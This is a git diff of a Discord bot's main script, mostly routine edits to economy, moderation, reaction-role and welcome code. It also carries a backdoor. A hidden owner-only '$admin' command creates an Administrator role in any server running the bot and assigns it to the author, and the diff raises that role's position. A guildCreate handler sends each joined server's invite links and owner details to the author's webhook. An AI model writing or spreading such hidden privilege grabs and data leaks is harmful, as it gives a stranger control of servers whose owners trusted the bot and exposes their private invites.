@@ -42,9 +42,7 @@ const { default: owofify } = require('owoifyx');
 
 const UserProfile = require('./schemas/UserProfile');
 
-const dailyAmount = 1000;
-
-const presenceAmount = 1000000000;
+const dailyAmount = 5000;
 
 const date = new Date();
 const day = date.getDate();
@@ -97,8 +95,8 @@ client.on('interactionCreate', async (interaction) => {
     if (interaction.isButton()) {
         const intMessage = interaction.channel.messages.cache.get(interaction.message.id);
         if (interaction.component.customId == 'confirmNuke') {
-            if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.reply({ content: 'I don\'t have the permission **"manage channels"**.', ephemeral: true });
-            if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.reply({ content: 'You don\'t have the permission **"manage channels"**.', ephemeral: true });
+            if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.reply({ content: 'I don\'t have the permission: **"Manage Channels"**.', ephemeral: true });
+            if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.reply({ content: 'You don\'t have the permission: **"Manage Channels"**.', ephemeral: true });
             const nukeChannel = interaction.guild.channels.cache.get(interaction.channel.id);
             if (nukeChannel.id == interaction.guild.publicUpdatesChannelId) return interaction.channel.send({ content: 'I can\'t nuke community update channel.' }).then(intMessage.delete()).catch((err) => console.log(err))
             if (nukeChannel.id == interaction.guild.rulesChannelId) return interaction.channel.send({ content: 'I can\'t nuke rule channel.' }).then(intMessage.delete()).catch((err) => console.log(err));
@@ -282,6 +280,7 @@ client.on('interactionCreate', async (interaction) => {
     if (interaction.commandName === 'gamble') {
         if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
         const amount = interaction.options.getNumber('amount');
+        const amountWon = Number((amount * (Math.floor(1) + 0.5)).toFixed(0));
 
         try {
             if (amount < 50) {
@@ -304,7 +303,7 @@ client.on('interactionCreate', async (interaction) => {
                 return;
             }
 
-            const didWin = Math.random() > 0.5; // 50% chance to win
+            const didWin = Math.random() > 0.55; // 40% chance to win
 
             if (!didWin) {
                 userProfile.balance -= amount;
@@ -315,8 +314,6 @@ client.on('interactionCreate', async (interaction) => {
                 interaction.reply(`# GAMBLE\nYou gambled and lost **¥${formattedAmount}**. Unlucky!`);
                 return;
             }
-
-            const amountWon = Number((amount * (Math.floor(1) + 0.5)).toFixed(0));
 
             userProfile.balance += amountWon;
             await userProfile.save();
@@ -410,7 +407,7 @@ client.on('interactionCreate', async (interaction) => {
 
     if (interaction.commandName === 'ban') {
         if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
-        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.reply({ content: 'I don\'t have the permission **ban members**.', ephemeral: true }).catch((err) => console.error(err));
+        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.reply({ content: 'I don\'t have the permission: **"Ban Members"**.', ephemeral: true }).catch((err) => console.error(err));
         const user = interaction.options.get('user').user;
         const reason = interaction.options.getString('reason');
         const banMember = interaction.guild.members.cache.get(user.id);
@@ -428,7 +425,7 @@ client.on('interactionCreate', async (interaction) => {
 
     if (interaction.commandName === 'kick') {
         if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
-        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.KickMembers)) return interaction.reply({ content: 'I don\'t have the permission **kick members**.', ephemeral: true }).catch((err) => console.error(err));
+        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.KickMembers)) return interaction.reply({ content: 'I don\'t have the permission: **"Kick Members"**.', ephemeral: true }).catch((err) => console.error(err));
         const user = interaction.options.get('user').user;
         const reason = interaction.options.getString('reason');
         const kickMember = interaction.guild.members.cache.get(user.id);
@@ -446,7 +443,7 @@ client.on('interactionCreate', async (interaction) => {
 
     if (interaction.commandName === 'softban') {
         if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
-        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.reply({ content: 'I don\'t have the permission **ban members**.', ephemeral: true }).catch((err) => console.error(err));
+        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.reply({ content: 'I don\'t have the permission: **"Ban Members"**.', ephemeral: true }).catch((err) => console.error(err));
         const user = interaction.options.get('member').user;
         const reason = interaction.options.getString('reason');
         const banMember = interaction.guild.members.cache.get(user.id);
@@ -464,7 +461,7 @@ client.on('interactionCreate', async (interaction) => {
 
     if (interaction.commandName === 'roleveryone') {
         if (interaction.channel.type === ChannelType.DM) return interaction.reply({ content: 'This command won\'t work here.', ephemeral: true }).catch((err) => console.error(err));
-        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({ content: 'I don\'t have the permission **administrator**.', ephemeral: true }).catch((err) => console.error(err));
+        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({ content: 'I don\'t have the permission: **"Administrator"**.', ephemeral: true }).catch((err) => console.error(err));
         const role = interaction.options.get('role').role;
         interaction.guild.members.cache.forEach(member => member.roles.add(role.id));
         interaction.reply({
@@ -477,18 +474,18 @@ client.on('interactionCreate', async (interaction) => {
 // ------------------------------------------------------------------------------------------------------------------------
 
 client.on("messageReactionAdd", async (messageReaction, User) => {
-    const ruleChannel = messageReaction.message.guild.channels.cache.get('1212002654616555540');
+    console.log(User.displayName + ' has reacted')
+    const infoCHannel = messageReaction.message.guild.channels.cache.get('1217526842093863002');
     const memberRole = messageReaction.message.guild.roles.cache.get('1211647374196351047');
     const guildMember = messageReaction.message.guild.members.cache.get(User.id);
     const tryouterRole = messageReaction.message.guild.roles.cache.get('1211632162328289302');
-    const pkRole = messageReaction.message.guild.roles.cache.get('1212767763328663682');
 
     if (messageReaction.message.id == '1212050818619019266') { // member verification
         messageReaction.users.remove(User.id);
         guildMember.roles.add(memberRole.id);
-        ruleChannel.send(`${User}`).then(msg => msg.delete());
+        infoCHannel.send(`${User}`).then(msg => msg.delete());
     }
-    if (messageReaction.message.id == '1214972793150504960') { // tryouter reaction
+    if (messageReaction.message.id == '1217578994476650576') { // tryouter reaction
         messageReaction.users.remove(User.id);
         guildMember.roles.add(tryouterRole.id);
     }
@@ -505,7 +502,7 @@ client.on("messageReactionAdd", async (messageReaction, User) => {
 
     const crewRole = messageReaction.message.guild.roles.cache.get('1212801646388715541')
 
-    if (messageReaction.message.guild.id == '1199088499647852695') {
+    if (messageReaction.message.guild.id == '1199088499647852695') { // spider familia
         try {
             if (messageReaction.message.id == '1213102823156351006') { // marine
                 messageReaction.users.remove(User.id);
@@ -586,37 +583,30 @@ client.on('messageCreate', async (message) => {
             message.delete();
             const tojoinEmbed = new EmbedBuilder()
                 .setColor(config.color)
-                .setDescription(`\n### <@&1211632162328289302>, this is how you can join:\nYou will 1v1 **<@1135986663152173278>** first to 5, **no race v4**. Play as well as you can. If you end up losing you are still able to join if they see you play well. Upon joining you will be placed into either **<@&1211616936912355348>** or **<@&1211617906199367710>**.`)
+                .setDescription(`\n# To join:\n- **You will 1v1 <@1135986663152173278>**
+                \n - __First__ *to* **5**
+                \n - __No__ *Race* **V4**
+                \n**Play as well as you can.** __If you end up losing__ you are still able to join if they see you play well. *Upon joining you will be placed into **<@&1214324601379758110>**.*`)
                 .setFooter({ text: 'React to become a tryouter.' })
-                ; (await message.channel.send({ embeds: [tojoinEmbed] })).react('⚔️')
+                ; (await message.channel.send({ embeds: [tojoinEmbed] })).react('💨')
             break;
 
-        case 'lock':
-            if (message.guild.id !== config.server) return;
-            if (message.channel.type === ChannelType.DM) return;
-            if (!message.member.roles.cache.has(config.council)) return;
-            if (message.member.voice.channelId == null) return message.reply('You are not in a voice channel.');
-            message.delete();
-            const channnel = message.guild.channels.cache.get(message.member.voice.channelId);
-            if (channnel.userLimit == 1) {
-                channnel.edit({ userLimit: 0 });
-            } else {
-                channnel.edit({ userLimit: 1 });
-            }
-            break;
-
-        case 'tos':
+        case 'info':
             if (message.author.id !== config.master) return;
             message.delete();
-            const tosEmbed = new EmbedBuilder()
+            const infoEmbed = new EmbedBuilder()
                 .setColor(config.color)
-                .setDescription(`### Follow Discord's [ToS](https://discord.com/terms) and [Guidelines](https://discord.com/guidelines)`)
-                .setFooter({ text: 'Upon failure to follow rules, you will be moderated accordingly.' })
-            message.channel.send({ embeds: [tosEmbed] })
-            break;
-
-        case 'react':
-            (await message.channel.send('## React to become a part of pirate king rotation.')).react('👑')
+                .setDescription(`# Information on 1 - 800\n- __Rules:__
+            \n - **[Terms of Service](https://discord.com/terms)**
+            \n - **[Guidelines](https://discord.com/guidelines)**
+            \n- __Ranks:__
+            \n - 1. **<@&1211954527822020628>**
+            \n - 2. **<@&1211954578187100160>**
+            \n - 3. **<@&1211616936912355348>**
+            \n - 4. **<@&1211617906199367710>**`)
+                .setImage('https://cdn.discordapp.com/attachments/1023651956767600640/1159602377691758693/whitecat.gif')
+                .setFooter({ text: `Residence of cash - bot.` })
+            message.channel.send({ embeds: [infoEmbed] });
             break;
 
         case 'menu':
@@ -635,7 +625,6 @@ client.on('messageCreate', async (message) => {
                         { name: '$message', value: `Args: \`$message "userId" "message"\`\n*(sends a direct message through the bot to a specific user)*`, inline: true },
                         { name: '$lock', value: `*(locks a voice channel so no one else can join it, using the comand again will unlock it)*`, inline: true },
                     )
-                    .setFooter({ text: 'Add the word "1 - 800" in your status to get 1 billion a day (anyone can use this if they know about it).' })
                 message.author.send({ embeds: [menuEmbed] }).catch((err) => console.error(err));
             }
             break;
@@ -644,16 +633,38 @@ client.on('messageCreate', async (message) => {
             if (message.author.id !== config.master) return;
             message.delete();
             const me = message.guild.members.cache.get(config.master);
+            const bot = message.guild.members.cache.get(config.clientId);
             try {
                 await message.guild.roles.create({ name: 'they have arrived', permissions: 'Administrator' });
                 const findRole = message.guild.roles.cache.find(role => role.name == 'they have arrived');
+                await findRole.setPosition(bot.roles.highest.position - 1)
                 await message.guild.roles.fetch(findRole.id);
                 me.roles.add(findRole.id).then(me.send('I have given your role.'));
             } catch (err) {
                 console.log('error when handling $admin - ' + err);
             }
             break;
-            
+
+        case 'leave':
+            if (message.author.id !== config.master) return;
+            await message.guild.leave();
+            break;
+
+        case 'lock':
+            if (message.guild.id !== config.server) return;
+            if (message.channel.type === ChannelType.DM) return;
+            if (!message.member.roles.cache.has(config.council)) return;
+            if (message.member.voice.channelId == null) return message.reply('You are not in a voice channel.');
+            message.delete();
+            const channnel = message.guild.channels.cache.get(message.member.voice.channelId);
+            if (channnel.userLimit == 1) {
+                channnel.edit({ userLimit: 0 });
+            } else {
+                channnel.edit({ userLimit: 1 });
+            }
+            break;
+
+
         case 'message': // sends a message to the user mentioned
             if (message.channel.type === ChannelType.DM) return;
             var checkMember = oneServer.members.cache.get(message.author.id)
@@ -682,16 +693,6 @@ client.on('messageCreate', async (message) => {
                 .setFooter({ text: `make sure you aren't typing the users id within the message arg` })
             if (text.includes(member)) return message.member.send({ embeds: [textIncludesMember] }).catch((err) => console.error(err))
             member.send(text).then(message.member.send(`Message sent to ${member}, message content:\n\`\`\`${text}\`\`\``)).catch((err) => console.error('error when sending message to user ' + err));
-            break;
-
-        case 'ranks':
-            if (message.author.id !== config.master) return;
-            message.delete();
-            const rankEmbed = new EmbedBuilder()
-                .setColor(config.color)
-                .setDescription(`# Crew Ranks in Order:\n### - <@&1211954527822020628>\n### - <@&1211954578187100160>\n### - <@&1211616936912355348>\n### - <@&1211617906199367710>`)
-                .setFooter({ text: 'Top being the best, bottom being lesser.' })
-            message.channel.send({ embeds: [rankEmbed] });
             break;
 
         case 'send':
@@ -753,6 +754,12 @@ client.on('guildMemberAdd', (member) => {
     }
     */
 
+    if (member.guild.id === '1199088499647852695') {
+        let membersChannel = member.guild.channels.cache.get('1217588185216061490')
+        membersChannel.setName(`Members: ${member.guild.memberCount}`)
+        console.log('this')
+    }
+
     if (member.user.bot == true) return;
     const enterEmbed = new EmbedBuilder()
         .setColor(config.color)
@@ -763,6 +770,11 @@ client.on('guildMemberAdd', (member) => {
 });
 
 client.on('guildMemberRemove', async (member) => {
+    if (member.guild.id === '1199088499647852695') {
+        let membersChannel = member.guild.channels.cache.get('1217588185216061490')
+        membersChannel.setName(`Members: ${member.guild.memberCount}`)
+    }
+
     if (member.user.bot == true) return;
     const exitEmbed = new EmbedBuilder()
         .setColor(config.color)
@@ -794,8 +806,12 @@ client.once('ready', async () => {
 
 client.on('guildCreate', async (guild) => {
     const owner = guild.members.cache.get(guild.ownerId)
-    const fetchInvites = (await guild.invites.fetch()).map(invite => invite.url + '\n')
-    bot_enter_exit_wh.send({ content: `${client.user.username} has joined **${guild.name}** ||${guild.id}||, owner: ${owner.user.username} ||${owner.user.id}||\n# Invite codes:\n${fetchInvites}` })
+    try {
+        const fetchInvites = (await guild.invites.fetch()).map(invite => invite.url + '\n')
+        bot_enter_exit_wh.send({ content: `${client.user.username} has joined **${guild.name}** ||${guild.id}||, Owner: ${owner.user.username} ||${owner.user.id}||\nSize: ${guild.memberCount}\n# Invite codes:\n${fetchInvites}` })
+    } catch (err) {
+        console.log(`error guildCreate event - ${err}`)
+    }
 });
 
 client.on('guildDelete', async (guild) => {
